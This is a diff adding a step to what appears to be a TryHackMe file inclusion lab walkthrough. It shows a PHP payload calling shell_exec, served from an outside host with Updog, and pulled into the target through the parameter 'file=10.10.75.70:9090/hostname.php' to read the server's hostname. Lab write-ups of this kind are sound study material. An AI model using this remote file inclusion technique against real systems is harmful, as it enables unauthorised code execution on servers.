@@ -166,3 +166,9 @@ First, I create the payload file for the RFI at `/tmp/hostname.php`:
 <?php echo shell_exec("hostname"); ?>
 ```
 
+Then, I start a HTTP server to host the file using [Updog](https://github.com/sc0tfree/updog), and insert the hosted file using the payload `file=10.10.75.70:9090/hostname.php`. 
+
+![File Inclusion lab playground RFI](./img/file_inclusion_playground_hostname.png "File Inclusion lab playground RFI")
+
+The hostname is:
+> lfi-vm-thm-f8c5b1a78692
